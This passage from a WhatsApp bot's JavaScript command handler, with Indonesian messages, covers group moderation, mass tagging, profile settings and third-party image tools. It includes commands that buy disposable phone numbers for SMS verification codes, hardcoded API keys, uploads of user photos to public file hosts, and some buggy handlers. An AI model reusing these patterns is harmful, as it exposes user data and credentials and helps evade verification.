           if (!ip1 || ip1.split(".").length < 4) return replyReinzID(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) replyReinzID(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By celiaofficial⚡_*`);
             else replyReinzID(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
  
   case 'leavegc': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
await replyReinzID(`Dadah semua, aku keluar dulu!!`)
await RyuuBotz.groupLeave(m.chat)
            }
            break
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RyuuBotz.groupParticipantsUpdate(m.chat, [users], 'add')
await replyReinzID(`sukses kak`)
}
break
case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyReinzID('*Choose:*\nsecond\nminute\nhour\n\n*Contoh*\n10 second')
}
replyReinzID(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
RyuuBotz.groupSettingUpdate(from, 'announcement')
replyReinzID(close)
}, timer)
}
break
           case 'ephemeral': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyReinzID('Enter the value enable/disable')
if (args[0] === 'enable') {
await RyuuBotz.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === 'disable') {
await RyuuBotz.sendMessage(m.chat, { disappearingMessagesInChat: false })
await replyReinzID(`sukses kak`)
}
            }
            break;
            case 'iqc': {
    if (!text) return reply('Mana teksnya?')
    if (text.length > 100) return reply('Maksimal 100 karakter!')
    
    await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})

    await RyuuBotz.sendMessage(m.chat, {
        image: {
            url: `https://flowfalcon.dpdns.org/imagecreator/iqc?text=${encodeURIComponent(text)}`
        },
        caption: 'Berikut gambarnya~'
    }, { quoted: m })
}
break;
            case 'delete':
            case 'cuih': 
            case 'piu': 
            case 'del': {            
if (!isAdmins) return reply(global.mess.admin)
if (!m.isGroup) return reply(mess.only.group)    
if (!m.quoted) throw false
let { chat, id } = m.quoted
await RyuuBotz.sendMessage(m.chat, {
    sticker: fs.readFileSync('./node_modules/Arisu-MD/stiker/ancam.webp')
}, { quoted: m });
 RyuuBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case '>l': {
if (!m.quoted) throw false
let { chat, id } = m.quoted
 RyuuBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let response = await RyuuBotz.groupInviteCode(m.chat)
RyuuBotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replyReinzID('The message was not sent by a bot!')
                 RyuuBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyReinzID('*Choose:*\nsecond\nminute\nhour\n\n*Contoh*\n10 second')
}
replyReinzID(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
RyuuBotz.groupSettingUpdate(from, 'not_announcement')
replyReinzID(open)
}, timer)
}
break
case 'sider':
  case 'siders': {
    const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
function msToDate(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  if (d == 0 && h == 0 && m == 0) {
        return "Baru Saja"
    } else {
        return [d, 'H ', h, 'J '].map(v => v.toString().padStart(2, 0)).join('')
    }
  
}
const metadata = await RyuuBotz.groupMetadata(m.chat);
const groupName = metadata.subject;
    var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        var pesan = "Harap aktif di grup karena akan ada pembersihan anggota setiap saat.*"
    } else {
        var pesan = text
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
            if (typeof global.db.users[member[i]] !== 'undefined') {
                if (global.db.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return reply(`*Tidak ada member sider pada grup ini.*`)
   RyuuBotz.sendMessage(m.chat, { text: `*${total}/${sum}* Anggota Grup *${groupName}* Menjadi Anggota Sider karena Alasan:\n1. Tidak Aktif Selama Lebih Dari 7 Hari\n2. Bergabung Namun Tidak Pernah Nimbrun\n_“${pesan}”_\n\n*Anggota Sider yang Terdaftar:*\n${sider.map(v => '  • @' + v.replace(/@.+/, '' + typeof global.db.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.users[v].lastseen))).join('\n')}`}, m, {
        contextInfo: {
            mentionedJid: sider
        }
    })
}
break
case 'kick':
case 'duar':
case 'dor':
{
  if (!m.isGroup) return reply('Perintah ini khusus admin grup dan hanya bisa digunakan di dalam grup.');

  if (!isAdmins && !isRyuuTheCreator) return reply(mess.admin);
  
  if (!isBotAdmins) return reply('_Bot harus menjadi admin terlebih dahulu untuk mengeluarkan anggota._');

  let users;
  if (m.mentionedJid.length > 0) {
    users = m.mentionedJid[0];
  } else if (m.quoted) {
    users = m.quoted.sender;
  } else if (text) {
    let number = text.replace(/[^0-9]/g, '');
    if (number.length < 5) return reply('Nomor tidak valid!');
    users = number + '@s.whatsapp.net';
  } else {
    return reply('Silakan tag, reply pesan, atau masukkan nomor yang ingin dikick!');
  }

  try {
  await RyuuBotz.sendMessage(m.chat, {
    sticker: fs.readFileSync('./node_modules/Arisu-MD/stiker/kick.webp')
}, { quoted: m });

    await RyuuBotz.groupParticipantsUpdate(m.chat, [users], 'remove');
    replyReinzID(`Sukses mengeluarkan @${users.split('@')[0]}`, { mentions: [users] });
  } catch (e) {
    console.error(e);
    reply('Gagal mengeluarkan anggota. Mungkin karena bot bukan admin atau mencoba mengeluarkan sesama admin.');
  }
}
break;
case 'kick-me':
case 'aduh-jatoh':
case 'adoh-jatoh':
case 'kickme': {
  if (!m.isGroup) return reply('Perintah ini hanya bisa digunakan di dalam grup.');
  
  if (!isBotAdmins) return reply('_Bot harus menjadi admin terlebih dahulu untuk mengeluarkan anggota._');

  try {
  await RyuuBotz.sendMessage(m.chat, {
    sticker: fs.readFileSync('./node_modules/Arisu-MD/stiker/kick.webp')
}, { quoted: m });

    await RyuuBotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
  } catch (e) {
    console.error(e);
    reply('Gagal mengeluarkan kamu. Mungkin bot bukan admin atau ada error lainnya.');
  }
}
break;
//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
const users = participants.map(a => a.id)
await RyuuBotz.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyReinzID(`sukses kak`)
}
break
case 'setbotname':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!text) return replyReinzID(`Dimana namanya?\nContoh: ${prefix + command} ReinzID BotID`)
    await RyuuBotz.updateProfileName(text)
    replyReinzID(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!text) return replyReinzID(`Dimana teksnya?\nContoh: ${prefix + command} ReinzID BotID`)
    await RyuuBotz.updateProfileStatus(text)
    replyReinzID(`Success in changing the bio of bot's number`)
    }
    break
   case 'setnamegc': case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyReinzID('Text ?')
await RyuuBotz.groupUpdateSubject(m.chat, text)
await replyReinzID(`sukses kak`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyReinzID('Text ?')
await RyuuBotz.groupUpdateDescription(m.chat, text)
await replyReinzID(`sukses kak`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return reply ("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await RyuuBotz.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
RyuuBotz.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break
case "getlayanan": {
if (!q) return reply(`Masukan Negara Yang Ingin Di Cari`)
var config = await fetchJson('https://virtusim.com/api/json.php?api_key=' + global.virtu + '&action=services&country=' + q)
let teks = `*⚡ BERIKUT LIST HARGA & LAYANAN YANG TERSEDIA ⚡*\n\n`
try {
if (config.data.status == false) return reply("Jika Ada Kendala Mohon Lapor Kan Ke Admin")
for (let r of config.data) {
teks +=`*🔑 ID :* ${r.id}\n*♦️ APLIKASI :* ${r.name}\n*💰 HARGA :* ${r.price}\n*📦 STOCK :* ${r.tersedia}\n\n`
}
reply(teks)
} catch (error) {
console.error('Error:',error);
reply(JSON.stringify(error, null, '\t'));
}
}
break;
case "nokos": {
if (!q) return reply(`Masukan ID Layanan Nokos`)
var cekhar = await fetchJson('https://virtusim.com/api/json.php?api_key=' + global.virtu + '&action=services&country=')
let x = false
Object.keys(cekhar.data).forEach((i) => {
if (cekhar.data[i].id == q){x = i}
})
const pricee = cekhar.data[x].price
const axios = require("axios");
var config = {
method: 'POST',
url: 'https://virtusim.com/api/json.php?api_key=' + global.virtu + '&action=order&service=' + q + '&operator=any'
}
axios(config)
.then(function (response) {
if (response.data.status == false) return reply(JSON.stringify(response.data.data.msg, null, '\t'));
if (response.data.status == true) {
reply(`*BERIKUT NOKOS ${response.data.data.service_name} ANDA*
 
* *ID Transaksi :* ${response.data.data.id}
* *Nomor Nokos :* ${response.data.data.number}
* *Operator/Kartu :* ${response.data.data.operator}
* *ID Aplikasi :* ${response.data.data.service_id}
* *Nama Aplikasi :* ${response.data.data.service_name}
* *Harga : Rp* ${pricee}

* Untuk Nomor Keblokir/Ban Silahkan Ketik .batal
* Untuk Mengecek Kode Sms Silahkan Ketik .kode ${response.data.data.id}
* Untuk Kode Tidak Masuk Silahkan Ketik .batal ${response.data.data.id}`)
}
})
.catch(function (error) {
console.error('Error:', error);
reply(JSON.stringify(error, null, '\t'));
});
}
break;
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!quoted) return replyReinzID(`Where is the picture?`)
if (!/image/.test(mime)) return replyReinzID(`Kirim/reply Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyReinzID(`Kirim/reply Gambar Dengan Caption ${prefix + command}`)
var mediz = await RyuuBotz.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await RyuuBotz.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replyReinzID(`Success`)
} else {
var memeg = await RyuuBotz.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replyReinzID(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
    await RyuuBotz.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
    await RyuuBotz.removeProfilePicture(RyuuBotz.user.id)
    replyReinzID(`Success in deleting bot's profile picture`)
    }
    break
case "promote":
        {
          if (!m.isGroup) {
            return reply(mess.only.group);
          }
          if (!isAdmins && !isRyuuTheCreator) {
            return reply("Khusus Admin!!");
          }
          if (!isBotAdmins) {
            return reply("ᴅᴜʜʜ, ᴀᴋᴜ ʙᴇʟᴜᴍ ᴊᴀᴅɪ ᴀᴅᴍɪɴ ɴɪʜʜʜ :ᴠ");
          }
          let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await RyuuBotz.groupParticipantsUpdate(m.chat, [users], "promote");
          await replyReinzID(`sukses kak`);
        }
        break;
      case "demote":
        {
          if (!m.isGroup) {
            return reply(mess.only.group);
          }
          if (!isAdmins && !isRyuuTheCreator) {
            return reply("Khusus Admin!!");
          }
          if (!isBotAdmins) {
            return reply("ᴅᴜʜʜ, ᴀᴋᴜ ʙᴇʟᴜᴍ ᴊᴀᴅɪ ᴀᴅᴍɪɴ ɴɪʜʜʜ :ᴠ");
          }
          let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await RyuuBotz.groupParticipantsUpdate(m.chat, [users], "demote");
          await replyReinzID(`sukses kak`);
        }
        break;
        case "promote-me": {
  if (!m.isGroup) return replyryuu("Fitur ini hanya untuk grup!");
  if (!isRyuuTheCreator) return replyryuu("Fitur ini khusus untuk *Owner Bot*!");

  if (!isBotAdmins) return replyryuu("Aku belum jadi admin, tidak bisa promote :(");

  await RyuuBotz.groupParticipantsUpdate(m.chat, [m.sender], "promote");
  await replyryuu("🛡️ *Owner berhasil dijadikan Admin oleh bot*");
}
break;
case "demote-me": {
  if (!m.isGroup) return replyryuu("Fitur ini hanya untuk grup!");
  if (!isRyuuTheCreator) return replyryuu("Fitur ini khusus untuk *Owner Bot*!");

  if (!isBotAdmins) return replyryuu("Aku belum jadi admin, tidak bisa demote :(");

  await RyuuBotz.groupParticipantsUpdate(m.chat, [m.sender], "demote");
  await replyryuu("🧹 *Owner berhasil dicabut adminnya oleh bot*");
}
break;
//case 'hidetag': case 'ht': {
//if (!m.isGroup) return reply(mess.only.group)
//if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
//if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
//RyuuBotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
//}
//break
case 'hidetag': case '.h': case 'ht': { 
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Jadiin gw Admin Terlebih Dahulu_')
let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
RyuuBotz.sendMessage(m.chat, {
text: `@${m.chat}\n${text}`,
contextInfo: {
mentionedJid: mem, 
groupMentions: [
   {
groupSubject: `minna`,
groupJid: m.chat,
    },
   ],
  },
});
}
break;
case 'shop': {
  let teks = `
*––––––『 𝙱𝚄𝚈𝙸𝙽𝙶 』––––––*

🎫 *Limit*
• Price : 10.000 Exp

✨ *Exp*
• Price : 1.000 Money

♋ *Chip*
• Stock : 98.976
• Price : 1.000.000 Money

🥤 *Potion*
• Stock : 9.985.367
• Price : 1.250 Money

🗑 *Trash*
• Stock : 6.434.953
• Price : 40 Money

🪵 *Wood*
• Stock : 994.018
• Price : 700 Money

🪨 *Rock*
• Stock : 1.000.361
• Price : 850 Money

🕸️ *String*
• Stock : 1.001.029
• Price : 400 Money

⛓️ *Iron*
• Stock : 988.534
• Price : 3.000 Money

💎 *Diamond*
• Stock : 5.745.743
• Price : 500.000 Money

❇️ *Emerald*
• Stock : 43.211
• Price : 100.000 Money

🪙 *Gold*
• Stock : 18.917
• Price : 100.000 Money

📦 *Common*
• Stock : 824.666
• Price : 10.000 Money

🛍️ *Uncommon*
• Stock : 1.006.899
• Price : 20.000 Money

🎁 *Mythic*
• Stock : 109.675
• Price : 75.000 Money

🗃️ *Legendary*
• Stock : 109.002
• Price : 200.000 Money

🍖 *Petfood*
• Stock : 100.000.004
• Price : 3.500 Money

🔖 *Pet*
• Stock : 98.599
• Price : 120.000 Money

🍇 *Anggur*
• Stock : 999.905
• Price : 2.000 Money

🍎 *Apel*
• Stock : 996.808
• Price : 2.000 Money

🍊 *Jeruk*
• Stock : 1.000.000
• Price : 2.000 Money

🥭 *Mangga*
• Stock : 999.698
• Price : 2.000 Money

🍌 *Pisang*
• Stock : 999.897
• Price : 2.000 Money

🌱 *Bibitanggur*
• Stock : 99.999.400
• Price : 2.000 Money

☘️ *Bibitapel*
• Stock : 99.999.380
• Price : 2.000 Money

🌿 *Bibitjeruk*
• Stock : 99.999.400
• Price : 2.000 Money

🍀 *Bibitmangga*
• Stock : 99.999.400
• Price : 2.000 Money

🌴 *Bibitpisang*
• Stock : 99.999.400
• Price : 2.000 Money

🪱 *Umpan*
• Stock : 99.999.608
• Price : 5.000 Money

🧂 *Garam*
• Stock : 99.999.989
• Price : 1.000 Money

🥃 *Minyak*
• Stock : 99.999.990
• Price : 1.000 Money

🌾 *Gandum*
• Stock : 100.000.000
• Price : 1.500 Money

🥩 *Steak*
• Stock : 99.997.494
• Price : 10.000 Money

🍗 *Ayam_goreng*
• Stock : 100.000.000
• Price : 10.000 Money

🍖 *Ribs*
• Stock : 100.000.000
• Price : 8.000 Money

🍞 *Roti*
• Stock : 99.999.500
• Price : 5.000 Money

🍤 *Udang_goreng*
• Stock : 100.000.000
• Price : 10.000 Money

🥓 *Bacon*
• Stock : 99.999.955
• Price : 5.000 Money

–––––––––––––––––––––––––
💁🏻‍♂ *ᴛɪᴩ :*
➠ ᴛᴏ ʙᴜʏ ɪᴛᴇᴍs:
*.buy [item] [jumlah]*
*Stock ga akan berubah*
▧ ᴇxᴀᴍᴩʟᴇ:
*.buy potion 10*
`.trim();

  reply(teks);
}
break;
case 'ht2': {
if (!m.isGroup) return reply(mess.only.group)
if (!isRyuuTheCreator) return reply(mess.only.owner)
RyuuBotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'totag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
               if (!m.quoted) return replyReinzID(`Reply message with caption ${prefix + command}`)
               RyuuBotz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isRyuuTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *penanda :*  @${me.split('@')[0]}
 🌿 *Isi pesan : ${q ? q : 'tidak ada pesan'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
RyuuBotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replyReinzID(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replyReinzID(eb)
}
break
case 'dbinary': {
if (!q) return replyReinzID(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replyReinzID(db)
}
break
case 'toanime': case 'jadianime': {
RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
const Websocket = require("ws");
const crypto = require("node:crypto");
const path = require("path");
const mime = require("mime-types");
const WS_URL = "wss://pixnova.ai/demo-photo2anime/queue/join";
const IMAGE_URL = "https://oss-global.pixnova.ai/";
const SESSION = crypto.randomBytes(5).toString("hex").slice(0, 9);
let wss;
let promise;

function _connect(log) {
  return new Promise((resolve, reject) => {
    wss = new Websocket(WS_URL);
    wss.on("open", () => {
      console.log("[ INFO ] Koneksi ke websocket tersambung.");
      resolve();
    })

    wss.on("error", (error) => {
      console.error("[ ERROR ] " + error);
      reject(error);
    })

    wss.on("message", (chunk) => {
      const data = JSON.parse(chunk.toString());
      if (promise && promise.once) {
        promise.call(data)
        promise = null;
      } else if (promise && !promise.once) {
        if (log) console.log(data);
        if (data?.code && data.code == 200 && data?.success && data.success == true) {
          let amba = data;
          amba.output.result.forEach((_, i) => {
            amba.output.result[i] = IMAGE_URL + amba.output.result[i]
          })
          promise.call(amba);
          promise = null;
        }
      }
    })
  })
}

function _send(payload, pr) {
  return new Promise(resolve => {
    wss.send(JSON.stringify(payload));
    if (pr) {
      promise = {
        once: true,
        call: resolve
      }
    } else {
      promise = {
        once: false,
        call: resolve
      }
    }
  })
}

async function PixNova(data, image, log) {
  let base64Image;
  if (/https\:\/\/|http\:\/\//i.test(image)) {
    const gs = await fetch(image);
    const kb = await gs.arrayBuffer();
    base64Image = Buffer.from(kb).toString("base64");
  } else if (Buffer.isBuffer(image)) {
    base64Image = image.toString("base64");
  } else {
    base64Image = image;
  }
  await _connect(log);
  let payload = {
    session_hash: SESSION
  }
  const resp = await _send(payload, true);
  if (log) console.log(`[ ${SESSION} ] Hash: ${JSON.stringify(resp, null, 2)}`);
  payload = {
    "data": {
      "source_image": `data:image/jpeg;base64,${base64Image}`,
      "strength": data?.strength || 0.6,
      "prompt": data.prompt,
      "negative_prompt": data.negative,
      "request_from": 2
    }
  }
  const out = await _send(payload, false);
  return out;
}
async function pomf2(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
        const contentType = mime.lookup(filePath) || "application/octet-stream";
        const fileName = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();
        const form = new FormData();
        form.append("files[]", fs.createReadStream(filePath), {
            contentType,
            filename: fileName, // Paksa nama file tetap JPG
        });
        const response = await axios.post("https://qu.ax/upload.php", form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        // Cek hasil
        if (!response.data.success || !response.data.files?.length) throw new Error("Upload gagal");
        
        return response.data.files[0].url;
    } catch (err) {
        console.error("Error:", err.message);
        return null;
    }
}
  const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
  const IMAGE = await pomf2(media)
  console.log(IMAGE)
  const LOGGER = true; // Menampilkan teks ke console selama proses
  const DATA = {
    prompt: "(masterpiece), best quality",
    negative: "(worst quality, low quality:1.4), (greyscale, monochrome:1.1), cropped, lowres , username, blurry, trademark, watermark, title, multiple view, Reference sheet, curvy, plump, fat, strabismus, clothing cutout, side slit,worst hand, (ugly face:1.2), extra leg, extra arm, bad foot, text, name",
    strength: 0.6
  }

  const result = await PixNova(DATA, IMAGE, LOGGER) // Buffer, Base64 atau url
  RyuuBotz.sendMessage(m.chat, { image: { url: result.output.result }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
  console.log(JSON.stringify(result, null, 2))
}
break
case 'upscale': {
				if (m.sender in enhance) return reply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);
				let q = m.quoted ? m.quoted : m;
				let mime = (q.msg || q).mimetype || q.mediaType || "";
				if (!mime) return reply(`Kirim/reply Gambar Dengan Caption ${prefix + command}`);
				if (!/image\/(jpe?g|png)/.test(mime)) 
					return reply(`Media tidak support!`);
				enhance[m.sender] = true;
				try {
					const availableScales = [2, 4, 6];
					let media = await q.download();
					let scale = availableScales.includes(parseInt(text)) ? parseInt(text) : 2;
					let tag = `@${m.sender.split("@")[0]}`;		
					let result = await upscale(media, scale);
					let caption = "🌟 *Effect*: HD\n";
					caption += `📩 *Requested by*: ${tag}\n`;
					caption += `✨ *Source*: imageupscaler.com\n`;
					caption += `🔍 *Skala*: ${scale}\n`;
					caption += `📏 *Available Scales*: ${availableScales.join(", ")}\n\n`;
					caption += "Terima kasih sudah menggunakan fitur ini ya, Bos! 😊";
			
					await RyuuBotz.sendMessage(m.chat, {
						image: { url: result },
						caption: caption,
						mentions: [m.sender]
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					reply("❌ Ups, terjadi kesalahan saat memproses gambar. Coba lagi nanti ya, Bos!");
				}
				delete enhance[m.sender];
				break;
			}

//=========================================\\
  case 'hd': {
  if (!quoted) return replyReinzID(`Dimana gambarnya?`);
  if (!/image/.test(mime)) return replyReinzID(`Kirim/reply Foto dengan caption *${prefix + command}*`);

  RyuuBotz.sendMessage(m.chat, { react: { text: `⏳️`, key: m.key } });

  try {
    const fs = require('fs');
    const axios = require('axios');
    const BodyForm = require('form-data');

    // 1️⃣ Download media
    let mediaPath = await RyuuBotz.downloadAndSaveMediaMessage(quoted);
    let fileSize = (fs.statSync(mediaPath).size / 1024).toFixed(2);

    // 2️⃣ Upload ke Catbox
    const catboxUpload = async (filePath) => {
      const formData = new BodyForm();
      formData.append('fileToUpload', fs.createReadStream(filePath));
      formData.append('reqtype', 'fileupload');
      formData.append('userhash', '');

      const res = await axios.post('https://catbox.moe/user/api.php', formData, {
        headers: formData.getHeaders()
      });

      if (!res.data.startsWith('https://')) {
        throw new Error(`Catbox gagal: ${res.data}`);
      }

      return res.data; // URL file
    };

    let uploadedUrl = await catboxUpload(mediaPath);

    // 3️⃣ Remini API
    const apiKey = 'ryuu';
    const apiUrl = `https://www.apiaccess.web.id/imagecreator/remini?apikey=${apiKey}&url=${encodeURIComponent(uploadedUrl)}`;

    const { data } = await axios.get(apiUrl, {
      headers: { 'User-Agent': 'RyuuBotz/1.0' }
    });

    if (!data.status || !data.result) {
      throw new Error('Remini API gagal memproses gambar');
    }

    // 4️⃣ Kirim hasil
    await RyuuBotz.sendMessage(m.chat, {
      image: { url: data.result },
      caption: `_Sudah HD kak_\nUkuran file asli: ${fileSize} KB`
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    replyReinzID(`Ups, terjadi kesalahan. Laporkan ke owner ya.\n*Makan tuh Error:* ${err.message}`);
  }
}
break;
//=========================================\\
case 'ss':
case 'ssweb':{
if (!text) return replyReinzID(`mana linknya kak?`)
try {
RyuuBotz.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nonogembul` }}, { quoted: m})
			} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
  case 'nulishitam': {
    if(!text) return reply('iya kak,  mau nulis apa? untuk menulis caranya begini ya\n> .nulis teks yang mau ditulis')
    RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
    RyuuBotz.sendMessage(m.chat, { image: { url: `https://www.velyn.biz.id/api/tools/tulisbuku?prompt=${encodeURIComponent(text)}` }, caption: 'berhasil..' }, { quoted: m })
    } catch {
      reply('yah Error kak laporankan ke owner agar di perbaiki')
    }
  }
break;
//======================================================================
case 'nulis':
  case 'magernulis': {
